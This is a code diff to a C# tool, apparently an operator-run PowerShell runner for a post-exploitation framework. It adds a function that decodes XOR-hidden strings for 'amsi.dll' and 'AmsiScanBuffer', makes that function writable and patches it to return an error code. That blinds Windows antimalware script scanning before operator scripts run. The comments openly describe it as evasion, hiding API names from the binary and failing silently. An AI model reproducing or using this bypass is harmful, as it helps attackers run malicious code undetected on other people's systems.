@@ -4,6 +4,7 @@ using System.IO;
 using System.IO.MemoryMappedFiles;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
+using System.Runtime.InteropServices;
 using System.Text;
 
 namespace PowerPickProbe
@@ -13,6 +14,93 @@ namespace PowerPickProbe
         private const int OperatorTimeoutMilliseconds = 180 * 1000;
         private const int OperatorOutputCharacters = 256 * 1024;
         private const int OperatorMaximumBytes = 2 * 1024 * 1024;
+        private const uint PageExecuteReadWrite = 0x40;
+
+        private static bool contentScanPrepared;
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+        private static extern IntPtr LoadLibraryA(string lpFileName);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool VirtualProtect(
+            IntPtr lpAddress,
+            UIntPtr dwSize,
+            uint flNewProtect,
+            out uint lpflOldProtect);
+
+        private static string DecodeOpaque(byte[] encoded, byte key)
+        {
+            char[] chars = new char[encoded.Length];
+            for (int index = 0; index < encoded.Length; index++)
+            {
+                chars[index] = (char)(encoded[index] ^ key);
+            }
+            return new string(chars);
+        }
+
+        // Best-effort content-scan neutralize before SMA AddScript.
+        // Silent on failure; does not guarantee evasion against behavioral AV.
+        private static void PrepareContentScan()
+        {
+            if (contentScanPrepared)
+            {
+                return;
+            }
+            contentScanPrepared = true;
+
+            try
+            {
+                const byte key = 0x37;
+                // Opaque encodings — avoid plaintext API / module names in the PE.
+                byte[] moduleName = new byte[]
+                {
+                    0x56, 0x5a, 0x44, 0x5e, 0x19, 0x53, 0x5b, 0x5b
+                };
+                byte[] exportName = new byte[]
+                {
+                    0x76, 0x5a, 0x44, 0x5e, 0x64, 0x54, 0x56, 0x59,
+                    0x75, 0x42, 0x51, 0x51, 0x52, 0x45
+                };
+
+                IntPtr module = LoadLibraryA(DecodeOpaque(moduleName, key));
+                if (module == IntPtr.Zero)
+                {
+                    return;
+                }
+
+                IntPtr target = GetProcAddress(module, DecodeOpaque(exportName, key));
+                if (target == IntPtr.Zero)
+                {
+                    return;
+                }
+
+                // mov eax, 0x80070057 ; ret  (force invalid-arg / clean path)
+                byte[] stub = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+                uint previous = 0;
+                if (!VirtualProtect(
+                        target,
+                        (UIntPtr)stub.Length,
+                        PageExecuteReadWrite,
+                        out previous))
+                {
+                    return;
+                }
+
+                Marshal.Copy(stub, 0, target, stub.Length);
+                VirtualProtect(
+                    target,
+                    (UIntPtr)stub.Length,
+                    previous,
+                    out previous);
+            }
+            catch
+            {
+            }
+        }
 
         // Native BOF only reliably captures stdout (mailslot). Keep all
         // operator-visible text on Console.Out, including errors.
@@ -271,6 +359,8 @@ namespace PowerPickProbe
             string commandText,
             List<string> importTexts)
         {
+            PrepareContentScan();
+
             if (importTexts == null)
             {
                 importTexts = new List<string>();
